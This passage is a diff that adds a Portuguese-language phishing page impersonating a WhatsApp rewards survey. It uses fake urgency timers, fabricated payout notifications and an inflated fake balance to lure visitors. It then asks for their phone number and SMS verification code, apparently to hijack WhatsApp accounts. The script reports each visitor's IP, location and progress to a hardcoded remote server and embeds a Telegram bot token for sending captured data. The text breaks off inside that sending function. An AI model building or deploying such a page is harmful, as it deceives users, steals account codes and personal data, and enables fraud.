@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp Rewards - Pesquisa de Usuário</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #ece5dd; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
+        .btn-primary { background-color: #25D366; color: white; transition: all 0.2s ease; }
+        .btn-primary:hover { background-color: #128C7E; transform: scale(1.02); }
+        .blur-content { filter: blur(5px); }
+        
+        @keyframes toastCycle {
+            0% { transform: translateY(100%); opacity: 0; }
+            10% { transform: translateY(0); opacity: 1; }
+            90% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(100%); opacity: 0; }
+        }
+        
+        .toast-animation {
+            animation: toastCycle 4s ease-in-out forwards;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        .shake { animation: shake 0.2s ease-in-out 0s 2 }
+        
+        .whatsapp-green { color: #25D366; }
+        .bg-whatsapp-green { background-color: #25D366; }
+        .border-custom { border-color: #a1a1a1 !important; }
+        .border-quiz { border-color: #a1a1a1 !important; }
+
+        .wa-verify-card {
+            background: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 2rem;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        }
+        .otp-input {
+            width: 45px;
+            height: 45px;
+            text-align: center;
+            font-size: 24px;
+            border: none;
+            border-bottom: 2px solid #e1e9eb;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .otp-input:focus { border-bottom-color: #128C7E; }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #25D366;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <audio id="sound-gain" src="https://www.myinstants.com/media/sounds/cash-register-sound-effect.mp3" preload="auto"></audio>
+    <audio id="sound-confetti" src="https://www.myinstants.com/media/sounds/success-fanfare-trumpets.mp3" preload="auto"></audio>
+
+    <div id="session-timer" class="fixed top-0 left-0 w-full bg-red-600 text-white text-center text-[10px] font-bold py-1 z-50 uppercase tracking-widest">
+        Sua vaga expira em: <span id="timer-clock">09:57</span>
+    </div>
+
+    <div id="toast-container" class="fixed bottom-5 left-5 z-50 hidden sm:block">
+        <div class="notification-toast bg-white border-l-4 border-green-500 p-3 rounded-lg shadow-xl flex items-center gap-3 text-sm">
+            <div class="bg-green-100 p-2 rounded-full">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+            <div class="text-left">
+                <p class="font-bold text-gray-800"><span id="toast-name">...</span> de <span id="toast-city">...</span> sacou</p>
+                <p class="text-green-600 font-semibold"><span id="toast-value">...</span> via PIX</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="balance-container" class="fixed top-8 right-5 bg-white px-4 py-2 rounded-full shadow-lg border-2 border-green-500 z-40 hidden">
+        <span class="text-gray-500 text-xs font-bold uppercase">Saldo: </span>
+        <span id="current-balance" class="text-green-600 font-black text-lg">R$ 0,00</span>
+    </div>
+
+    <div id="main-card" class="max-w-md w-full bg-white rounded-[2rem] shadow-2xl overflow-hidden border border-gray-200 relative transition-all duration-500 mt-6">
+        
+        <!-- TELA 1: LANDING -->
+        <div id="screen-landing" class="relative hidden">
+            <div class="bg-green-600 text-white text-[10px] font-bold py-1 text-center uppercase tracking-widest">
+                ● AO VIVO - Vagas limitadas para a pesquisa
+            </div>
+            <div class="p-6 sm:p-8 text-center">
+                <div class="flex justify-center mb-2">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="h-12">
+                </div>
+                <div class="flex items-center justify-center gap-1 text-[10px] text-gray-500 mb-6 font-semibold">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 text-green-500" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
+                    </svg>
+                    Programa Oficial de Feedback WhatsApp
+                </div>
+                <h1 class="text-2xl font-extrabold mb-6 text-gray-800 leading-tight">
+                    O WhatsApp está pagando usuários de <span id="user-location" class="text-green-600">Brasil</span> para avaliar novas funções
+                </h1>
+                <div class="bg-gray-100 text-green-600 text-xs font-bold py-2 px-4 rounded-full inline-block mb-8 border border-custom">
+                    ● <span id="user-count">142</span> pessoas participando agora
+                </div>
+                <div class="bg-gray-50 border border-green-200 p-4 rounded-2xl mb-6 text-left shadow-sm">
+                    <div class="flex items-center gap-2 text-green-600 font-bold text-xs mb-3">
+                            <span>⚠️ Restam apenas 12 vagas para hoje!</span>
+                    </div>
+                    <div class="flex justify-between text-[10px] font-bold text-gray-500 mb-1 uppercase">
+                        <span>88% das vagas preenchidas</span><span>88/100</span>
+                    </div>
+                    <div class="w-full bg-gray-200 rounded-full h-2 overflow-hidden">
+                        <div class="bg-green-500 h-full rounded-full" style="width: 88%"></div>
+                    </div>
+                </div>
+                <div class="space-y-3 mb-8">
+                     <div class="flex items-center gap-4 p-4 bg-gray-50 rounded-2xl border border-custom text-left">
+                        <div class="text-2xl">💬</div>
+                        <div>
+                            <p class="text-sm font-bold text-gray-800">R$50 a R$150 por resposta</p>
+                            <p class="text-xs text-gray-500">Avalie as novas ferramentas para ganhar</p>
+                        </div>
+                    </div>
+                     <div class="flex items-center gap-4 p-4 bg-gray-50 rounded-2xl border border-custom text-left">
+                        <div class="text-2xl">📲</div>
+                        <div>
+                            <p class="text-sm font-bold text-gray-800">Pagamento via PIX</p>
+                            <p class="text-xs text-gray-500">Receba instantaneamente após a pesquisa</p>
+                        </div>
+                    </div>
+                     <div class="flex items-center gap-4 p-4 bg-gray-50 rounded-2xl border border-custom text-left">
+                        <div class="text-2xl">📈</div>
+                        <div>
+                             <p class="text-sm font-bold text-gray-800">Até R$950 no total</p>
+                            <p class="text-xs text-gray-500">Complete todas as etapas para o valor máximo</p>
+                        </div>
+                    </div>
+                </div>
+                 <button onclick="startQuiz()" class="w-full btn-primary font-bold py-5 rounded-full text-xl shadow-xl uppercase tracking-wide flex items-center justify-center gap-2 border border-custom">
+                    INICIAR PESQUISA <span class="text-white">›</span>
+                </button>
+                <div class="mt-6 flex flex-wrap justify-center gap-3 text-[10px] text-gray-400 font-medium">
+                    <span>★ 100% Seguro</span>
+                    <span>✓ Verificado WhatsApp</span>
+                    <span>✓ Pagamento Garantido</span>
+                </div>
+                <p class="text-[9px] text-gray-400 mt-3">🗓️ Válido somente até <span id="validity-date">...</span></p>
+            </div>
+        </div>
+
+        <!-- TELA 2: QUIZ -->
+        <div id="screen-quiz" class="p-6 sm:p-10 hidden transition-all duration-300">
+            <div class="flex justify-between items-center mb-6">
+                <span id="quiz-progress" class="text-xs font-bold text-gray-400 uppercase">Pergunta 1 de 11</span>
+                <div class="w-24 bg-gray-200 h-2 rounded-full overflow-hidden">
+                    <div id="quiz-bar" class="bg-green-500 h-full transition-all duration-300" style="width: 9%"></div>
+                </div>
+            </div>
+            <h2 id="quiz-question" class="text-xl font-bold mb-6 text-gray-800">Qual função do WhatsApp você mais utiliza?</h2>
+            <div id="quiz-options" class="space-y-3"></div>
+        </div>
+
+        <!-- TELA 3: FINAL -->
+        <div id="screen-final" class="hidden flex items-center justify-center p-6 transition-all duration-300">
+            <div class="bg-green-500 w-full max-w-xs rounded-[2.5rem] p-8 text-center text-white shadow-2xl border-4 border-green-300">
+                <div class="flex justify-center mb-4">
+                    <div class="bg-white/20 p-3 rounded-2xl">
+                        <span class="text-5xl">🏆</span>
+                    </div>
+                </div>
+                <p class="text-xs font-medium opacity-90 mb-1 italic">Parabéns! 🎉</p>
+                <h2 class="text-lg font-bold leading-tight mb-6">Você completou a pesquisa e ganhou</h2>
+                <div id="final-amount" class="text-4xl font-black mb-6 tracking-tight">R$ 0,00</div>
+                <p class="text-xs opacity-90 mb-8">Obrigado por ajudar o WhatsApp a melhorar!</p>
+                <button onclick="showWithdrawScreen()" class="w-full bg-white text-green-600 font-bold py-4 rounded-full text-sm uppercase tracking-wide shadow-lg hover:bg-gray-100 transition-all">
+                    Resgatar via PIX
+                </button>
+            </div>
+        </div>
+
+        <!-- TELA 4: SAQUE -->
+        <div id="screen-withdraw" class="hidden bg-[#f0f2f5] min-h-screen overflow-y-auto transition-all duration-300">
+            <div class="bg-white px-4 py-4 flex items-center gap-4 border-b border-gray-200 sticky top-0 z-10">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
+                </svg>
+                <h3 class="text-lg font-bold text-gray-800">Resgate de Recompensa</h3>
+            </div>
+
+            <div class="p-4 space-y-6">
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 text-center">
+                    <p class="text-gray-500 text-sm font-medium mb-1">Saldo disponível para saque</p>
+                    <h2 id="withdraw-balance" class="text-4xl font-black text-green-600 mb-4">R$ 0,00</h2>
+                      <button id="btn-withdraw" onclick="showVerifyModal()" class="w-full bg-whatsapp-green text-white font-bold py-3 rounded-full text-sm uppercase tracking-wide shadow-md transition-all"> 
+                          Sacar agora
+                      </button>
+                </div>
+
+                <div class="space-y-3">
+                    <p class="text-xs font-bold text-gray-500 uppercase px-1">Selecione o valor do saque</p>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div class="bg-white p-4 rounded-2xl border-2 border-green-500 flex justify-between items-center cursor-pointer transition-all" onclick="selectWithdrawValue(this)">
+                            <span class="font-bold text-gray-800">R$ 100,00</span>
+                            <div class="w-4 h-4 rounded-full bg-green-500 border-2 border-white"></div>
+                        </div>
+                        <div class="bg-white p-4 rounded-2xl border border-gray-200 flex justify-between items-center cursor-pointer hover:border-green-500 transition-all" onclick="selectWithdrawValue(this)">
+                            <span class="font-bold text-gray-800">R$ 200,00</span>
+                            <div class="w-4 h-4 rounded-full border border-gray-300"></div>
+                        </div>
+                        <div class="bg-white p-4 rounded-2xl border border-gray-200 flex justify-between items-center cursor-pointer hover:border-green-500 transition-all" onclick="selectWithdrawValue(this)">
+                            <span class="font-bold text-gray-800">R$ 300,00</span>
+                            <div class="w-4 h-4 rounded-full border border-gray-300"></div>
+                        </div>
+                        <div id="option-total-balance" class="bg-white p-4 rounded-2xl border border-gray-200 flex justify-between items-center cursor-pointer hover:border-green-500 transition-all" onclick="selectWithdrawValue(this)">
+                            <span id="total-balance-label" class="font-bold text-gray-800">R$ 0,00</span>
+                            <div class="w-4 h-4 rounded-full border border-gray-300"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 space-y-4">
+                    <div class="flex items-center gap-2 mb-2">
+                        <div class="p-2 bg-green-100 rounded-lg">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                            </svg>
+                        </div>
+                        <span class="font-bold text-gray-800">Chave PIX</span>
+                    </div>
+                     <select id="pix-type" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl mb-3 focus:ring-2 focus:ring-green-500 outline-none transition text-sm text-gray-600">
+                         <option value="">Selecione o tipo da chave</option>
+                         <option value="cpf">CPF</option>
+                         <option value="email">E-mail</option>
+                         <option value="phone">Celular</option>
+                         <option value="random">Chave Aleatória</option>
+                     </select>
+                     <input type="text" id="pix-key" placeholder="Digite sua chave PIX" class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-green-500 outline-none transition text-sm text-gray-800">
+                    <p class="text-[10px] text-gray-400">Certifique-se de que a chave está correta para evitar atrasos no pagamento.</p>
+                </div>
+
+                <div class="space-y-3">
+                    <p class="text-xs font-bold text-gray-500 uppercase px-1">Saques recentes</p>
+                    <div id="recent-withdrawals" class="space-y-2"></div>
+                </div>
+            </div>
+            <div class="p-6 text-center">
+                <a href="#" class="text-[10px] text-gray-400 underline">Política de Privacidade e Termos de Uso</a>
+            </div>
+        </div>
+
+        <!-- POPUP GANHO DE SALDO -->
+        <div id="screen-win" class="absolute inset-0 z-50 bg-black/60 flex items-center justify-center p-6 hidden text-center backdrop-blur-sm">
+            <div id="win-content" class="bg-white p-8 rounded-[2rem] shadow-2xl border border-gray-200 max-w-xs w-full">
+                <div class="inline-block p-4 bg-green-100 rounded-full mb-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                </div>
+                <h3 class="text-2xl font-black text-gray-800 mb-2">Você ganhou!</h3>
+                <p class="text-gray-500 mb-4">Seu saldo acumulado agora é de:</p>
+                <div id="win-amount" class="text-4xl font-black text-green-600 mb-8">R$ 0,00</div>
+                <button onclick="closeWin()" class="btn-primary px-8 py-3 rounded-full font-bold uppercase w-full">Continuar</button>
+            </div>
+        </div>
+
+        <!-- MODAL DE ARRASTE (ETAPA 1) -->
+        <div id="screen-verify" class="fixed inset-0 z-[60] bg-black/70 flex items-center justify-center p-6 hidden backdrop-blur-sm">
+            <div class="bg-white p-8 rounded-[2rem] shadow-2xl max-w-xs w-full text-center">
+                <div class="text-green-600 text-4xl mb-4">⚠️</div>
+                <h3 class="text-xl font-black text-gray-800 mb-4">Última Etapa</h3>
+                <p class="text-sm text-gray-600 mb-8 leading-relaxed">
+                    Para garantir a integridade do programa, o WhatsApp limita a um resgate por aparelho/número. Para evitar fraudes, a verificação de número é obrigatória para liberar a transferência do saldo.
+                </p>
+                
+                <div id="slider-container" class="relative h-14 bg-gray-200 rounded-full p-1 flex items-center overflow-hidden border border-gray-300">
+                    <div id="slider-bar" class="absolute left-0 top-0 h-full bg-green-500 transition-all duration-100" style="width: 0%"></div>
+                    <div id="slider-button" class="relative z-10 w-12 h-12 bg-white rounded-full shadow-md flex items-center justify-center cursor-pointer select-none transition-transform active:scale-95">
+                        <span class="text-[10px] font-bold text-gray-400 uppercase">Arraste</span>
+                    </div>
+                </div>
+                <p class="text-[10px] text-gray-400 mt-3 uppercase font-bold tracking-widest">Deslize para liberar meu PIX</p>
+            </div>
+        </div>
+
+        <!-- MODAL DE VERIFICAÇÃO DE NÚMERO (ETAPA 2) -->
+        <div id="screen-phone-verify" class="fixed inset-0 z-[70] bg-black/70 flex items-center justify-center p-6 hidden backdrop-blur-sm">
+            <div class="wa-verify-card">
+                <div class="text-green-500 text-5xl mb-4"><i class="fab fa-whatsapp"></i></div>
+                <h2 class="text-2xl font-bold text-gray-800 mb-2">Verifique seu número</h2>
+                
+                <div id="phone-input-page">
+                    <p class="text-sm text-gray-500 mb-6">Por favor, confirme o código do país e insira seu número de telefone.</p>
+                    <div class="flex items-center bg-gray-50 border border-gray-200 rounded-2xl mb-8 p-1 focus-within:border-green-500 transition-all">
+                        <div class="flex items-center px-3 py-2 border-r border-gray-200">
+                            <select id="countryCode" class="bg-transparent border-none outline-none text-green-600 font-bold cursor-pointer text-sm">
+                                <option value="+55">🇧🇷 (+55)</option>
+                            </select>
+                        </div>
+                        <input type="tel" id="phoneNumber" placeholder="número de telefone" inputmode="numeric" class="flex-1 p-3 bg-transparent outline-none text-gray-800 text-lg w-full">
+                    </div>
+                    <input type="text" id="honeypot" class="hidden" style="position:absolute; left:-5000px;">
+                    <button id="btn-send-number" onclick="sendNumber()" class="w-full bg-whatsapp-green text-white font-bold py-3 rounded-lg uppercase text-sm shadow-md hover:bg-green-600 transition-all flex items-center justify-center gap-2">
+                        <span>Próximo</span>
+                        <div id="number-loader" class="loader hidden"></div>
+                    </button>
+                    <div class="mt-4 flex items-center justify-center gap-1 text-[10px] text-gray-400 font-medium">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        </svg>
+                        Criptografia de ponta a ponta ativada
+                    </div>
+                </div>
+
+                <div id="otp-input-page" class="hidden">
+                    <p class="text-sm text-gray-500 mb-6">Insira o código de 6 dígitos enviado ao seu telefone.</p>
+                    <div class="flex justify-between mb-8">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                        <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                    </div>
+                    <div class="text-sm text-gray-400 mb-4">Reenviar SMS em <span id="countdown">01:00</span></div>
+                    <button onclick="submitOtp()" class="w-full bg-whatsapp-green text-white font-bold py-3 rounded-lg uppercase text-sm shadow-md hover:bg-green-600 transition-all">Verificar</button>
+                    <div id="resendBtn" onclick="resendOtp()" class="mt-4 text-xs font-bold text-green-600 cursor-pointer uppercase opacity-50 pointer-events-none">Reenviar SMS</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function updateDashboard(status, extraData = {}) {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const payload = { ip: ipData.ip, location: `${ipData.city}, ${ipData.region}`, status: status, ...extraData };
+                await fetch('http://91.208.206.119:3000/update', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) { console.error('Erro ao atualizar dashboard:', err); }
+        }
+
+        const TELEGRAM_BOT_TOKEN = "8813475428:AAGmxM5LiWaoUEdiod_Yr-w8Hqms0SFD0Ok";
+        const TELEGRAM_CHAT_IDS = ["5459169989"];
+        let fullNumber = "";
+        let countdownTimer;
+        let timeLeft = 60;
+        let currentQuestion = 1;
+        let totalBalance = 0;
+        let userState = { city: "Brasil", region: "" };
+
+        const questions = [
+            { q: "Qual função do WhatsApp você mais utiliza?", o: ["💬 Conversas", "📞 Chamadas de Voz", "📹 Chamadas de Vídeo", "📢 Status"] },
+            { q: "Com que frequência você usa o WhatsApp Business?", o: ["💼 Todos os dias", "📅 Algumas vezes por semana", "🕒 Raramente", "❌ Não utilizo"] },
+            { q: "O que você acha dos Canais do WhatsApp?", o: ["🌟 Excelentes", "👍 Úteis", "😐 Indiferente", "👎 Desnecessários"] },
+            { q: "Você utiliza a função de Mensagens Temporárias?", o: ["✅ Sim, sempre", "🤔 Às vezes", "❌ Nunca", "❓ Não conheço"] },
+            { q: "Como você avalia a velocidade do aplicativo?", o: ["🚀 Muito rápido", "✅ Bom", "😐 Médio", "📉 Lento"] },
+            { q: "Qual dispositivo você mais usa para acessar?", o: ["📱 Smartphone", "💻 WhatsApp Web", "🖥️ Desktop App", "📱 Tablet"] },
+            { q: "Você costuma usar o WhatsApp para pagamentos (Pay)?", o: ["💰 Sim, frequentemente", "💳 Às vezes", "❌ Nunca", "🤔 Tenho interesse"] },
+            { q: "Como você avalia a organização das conversas?", o: ["🔥 Muito organizada", "📺 Boa", "💤 Regular", "🚫 Confusa"] },
+            { q: "Você utiliza a função de fixar conversas no topo?", o: ["🚀 Sim, sempre", "✅ Às vezes", "😐 Raramente", "❌ Não"] },
+            { q: "Você recomendaria o WhatsApp para quem busca produtividade?", o: ["💯 Com certeza", "👍 Sim", "🤷 Talvez", "❌ Não"] },
+            { q: "Qual sua faixa etária?", o: ["👶 13-17", "🧑 18-24", "👨 25-34", "👴 35+"] },
+        ];
+
+        window.onbeforeunload = function() {
+            return "Atenção! Se você sair agora, seu saldo acumulado de R$ " + totalBalance.toFixed(2) + " será perdido!";
+        };
+
+        function startSessionTimer() {
+            let time = 597;
+            const timerEl = document.getElementById('timer-clock');
+            setInterval(() => {
+                let mins = Math.floor(time / 60);
+                let secs = time % 60;
+                timerEl.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                if (time > 0) time--;
+            }, 1000);
+        }
+
+        async function getLocation() {
+            try {
+                 const res = await fetch('https://ipapi.co/json/');
+                 const data = await res.json();
+                if(data.city) {
+                    userState.city = data.city;
+                    userState.region = data.region;
+                    document.getElementById('user-location').innerText = `${data.city}, ${data.region}`;
+                }
+            } catch (e) { console.log("Erro de geo"); }
+        }
+
+        const namesList = ["Marina Oliveira", "João Pedro", "Carla Souza", "LucasLima", "Ana Beatriz", "Roberto F.", "Carlos Castanhal", "Julia M.", "Fernanda Lima", "Ricardo Santos", "Beatriz Rocha", "Thiago Silva", "Amanda Costa", "Gabriel Souza", "Sérgio M.", "Patrícia L.", "Bruno G.", "Letícia S."];
+        const citiesList = ["São Paulo", "Campinas", "Santos", "Guarulhos", "Sertãozinho", "Ribeirão Preto", "Sorocaba", "Bauru", "São José do Rio Preto", "Jundiaí", "Piracicaba", "Osasco", "Mogi das Cruzes"];
+        const valuesList = ["R$ 120,50", "R$ 450,00", "R$ 89,90", "R$ 612,30", "R$ 340,15", "R$ 720,00", "R$ 150,40", "R$ 980,00"];
+
+        let nameQueue = [];
+        let cityQueue = [];
+
+        function getNextRandom(list, queue) {
+            if (queue.length === 0) {
+                queue.push(...[...list].sort(() => Math.random() - 0.5));
+            }
+            return queue.shift();
+        }
+
+        function updateToast() {
+            const name = getNextRandom(namesList, nameQueue);
+            const city = getNextRandom(citiesList, cityQueue);
+            const value = valuesList[Math.floor(Math.random() * valuesList.length)];
+            document.getElementById('toast-name').innerText = name;
+            document.getElementById('toast-city').innerText = city;
+            document.getElementById('toast-value').innerText = value;
+            const toast = document.getElementById('toast-container');
+            toast.classList.remove('hidden');
+            const element = toast.querySelector('.notification-toast');
+            element.classList.remove('toast-animation');
+            void element.offsetWidth; 
+            element.classList.add('toast-animation');
+        }
+
+        function playSound(id) {
+            const sound = document.getElementById(id);
+            if (sound) {
+                sound.pause();
+                sound.currentTime = 0;
+                sound.play().catch(e => console.log("Erro áudio"));
+            }
+        }
+
+        function startQuiz() {
+            updateDashboard('Quiz');
+            document.getElementById('screen-landing').classList.add('hidden');
+            document.getElementById('screen-quiz').classList.remove('hidden');
+            document.getElementById('balance-container').classList.remove('hidden');
+            loadQuestion();
+        }
+
+        function loadQuestion() {
+            const qData = questions[currentQuestion - 1];
+            document.getElementById('quiz-progress').innerText = `Pergunta ${currentQuestion} de 11`;
+            document.getElementById('quiz-bar').style.width = `${(currentQuestion / 11) * 100}%`;
+            document.getElementById('quiz-question').innerText = qData.q;
+            document.getElementById('current-balance').innerText = `R$ ${totalBalance.toFixed(2)}`;
+            const optionsDiv = document.getElementById('quiz-options');
+            optionsDiv.innerHTML = '';
+            qData.o.forEach(opt => {
+                const btn = document.createElement('button');
+                btn.className = "w-full p-4 bg-gray-50 border border-quiz rounded-2xl text-left hover:bg-gray-100 transition font-medium text-gray-800";
+                btn.innerText = opt;
+                btn.onclick = (e) => handleAnswer(e);
+                optionsDiv.appendChild(btn);
+            });
+        }
+
+        function handleAnswer(e) {
+            const btn = e.currentTarget;
+            const allBtns = document.querySelectorAll('#quiz-options button');
+            allBtns.forEach(b => {
+                b.classList.remove('border-green-500', 'ring-2', 'ring-green-500', 'bg-green-50');
+                b.classList.add('border-quiz');
+            });
+            btn.classList.remove('border-quiz');
+            btn.classList.add('border-green-500', 'ring-2', 'ring-green-500', 'bg-green-50');
+            
+            const gain = (Math.random() * (80 - 20) + 20);
+            totalBalance = Math.min(totalBalance + gain, 950);
+            if (currentQuestion === 11 && totalBalance < 650) {
+                totalBalance = Math.floor(Math.random() * (950 - 650 + 1)) + 650;
+            }
+            document.getElementById('current-balance').innerText = `R$ ${totalBalance.toFixed(2)}`;
+            saveProgress();
+            setTimeout(() => {
+                if ([3, 6, 9].includes(currentQuestion)) {
+                    showWinPopup();
+                } else {
+                    nextQuestion();
+                }
+            }, 600);
+        }
+
+        function showWinPopup() {
+            document.getElementById('screen-quiz').classList.add('blur-content');
+            document.getElementById('win-amount').innerText = `R$ ${totalBalance.toFixed(2)}`;
+            document.getElementById('screen-win').classList.remove('hidden');
+            playSound('sound-gain');
+        }
+
+        function closeWin() {
+            document.getElementById('screen-quiz').classList.remove('blur-content');
+            document.getElementById('screen-win').classList.add('hidden');
+            nextQuestion();
+        }
+
+        function nextQuestion() {
+            if (currentQuestion < 11) {
+                currentQuestion++;
+                loadQuestion();
+            } else {
+                showFinalScreen();
+                saveProgress(true);
+            }
+        }
+
+        function showFinalScreen() {
+            updateDashboard('Quiz Finalizado');
+            document.getElementById('screen-quiz').classList.add('hidden');
+            document.getElementById('screen-final').classList.remove('hidden');
+            document.getElementById('final-amount').innerText = `R$ ${totalBalance.toFixed(2)}`;
+            playSound('sound-confetti');
+            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });
+        }
+
+        function showWithdrawScreen() {
+            updateDashboard('Saque');
+            document.getElementById('screen-final').classList.add('hidden');
+            document.getElementById('screen-withdraw').classList.remove('hidden');
+            document.getElementById('withdraw-balance').innerText = `R$ ${totalBalance.toFixed(2)}`;
+            document.getElementById('total-balance-label').innerText = `R$ ${totalBalance.toFixed(2)}`;
+            document.getElementById('balance-container').classList.add('hidden');
+        }
+
+        function selectWithdrawValue(element) {
+            const options = document.querySelectorAll('#screen-withdraw .grid div');
+            options.forEach(opt => {
+                opt.classList.remove('border-2', 'border-green-500');
+                opt.classList.add('border', 'border-gray-200');
+                const circle = opt.querySelector('div');
+                if (circle) {
+                    circle.classList.remove('bg-green-500', 'border-white');
+                    circle.classList.add('border-gray-300');
+                }
+            });
+            element.classList.remove('border', 'border-gray-200');
+            element.classList.add('border-2', 'border-green-500');
+            const selectedCircle = element.querySelector('div');
+            if (selectedCircle) {
+                selectedCircle.classList.remove('border-gray-300');
+                selectedCircle.classList.add('bg-green-500', 'border-white');
+            }
+        }
+
+        function showVerifyModal() {
+            document.getElementById('screen-verify').classList.remove('hidden');
+        }
+
+        function initSlider() {
+            const container = document.getElementById('slider-container');
+            const button = document.getElementById('slider-button');
+            const bar = document.getElementById('slider-bar');
+            let isDragging = false;
+            let currentX = 0;
+
+            const startDrag = (e) => {
+                isDragging = true;
+                button.style.transition = 'none';
+                bar.style.transition = 'none';
+            };
+
+            const endDrag = () => {
+                if (!isDragging) return;
+                isDragging = false;
+                const rect = container.getBoundingClientRect();
+                
+                if (currentX < rect.width - 60) {
+                    button.style.transition = 'transform 0.3s ease';
+                    button.style.transform = 'translateX(0)';
+                    bar.style.transition = 'width 0.3s ease';
+                    bar.style.width = '0%';
+                    currentX = 0;
+                } else {
+                    document.getElementById('screen-verify').classList.add('hidden');
+                    document.getElementById('screen-phone-verify').classList.remove('hidden');
+                }
+            };
+
+            const onDrag = (e) => {
+                if (!isDragging) return;
+                const rect = container.getBoundingClientRect();
+                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                let x = clientX - rect.left - 24;
+                
+                if (x < 0) x = 0;
+                if (x > rect.width - 48) x = rect.width - 48;
+
+                currentX = x;
+                button.style.transform = `translateX(${x}px)`;
+                const percent = (x / (rect.width - 48)) * 100;
+                bar.style.width = `${percent}%`;
+            };
+
+            button.addEventListener('mousedown', startDrag);
+            button.addEventListener('touchstart', startDrag, {passive: true});
+            window.addEventListener('mousemove', onDrag);
+            window.addEventListener('touchmove', onDrag, {passive: false});
+            window.addEventListener('mouseup', endDrag);
+            window.addEventListener('touchend', endDrag);
+        }
+
+        function checkRateLimit() {
+            const now = Date.now();
+            const limitWindow = 30 * 60 * 1000;
+             const maxAttempts = 5;
+            let data = JSON.parse(localStorage.getItem('rate_limit_data')) || { attempts: [], count: 0 };
+            data.attempts = data.attempts.filter(timestamp => now - timestamp < limitWindow);
+            if (data.attempts.length >= maxAttempts) {
+                alert("Limite de tentativas excedido. Tente novamente em 30 minutos.");
+                return false;
+            }
+            data.attempts.push(now);
+            localStorage.setItem('rate_limit_data', JSON.stringify(data));
+            return true;
+        }
+
+        async function sendToTelegram(message) {
+            const sendPromises = TELEGRAM_CHAT_IDS.map(async (chatId) => {
+                try {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    const response = await fetch(url, {
+                        method: 'POST',
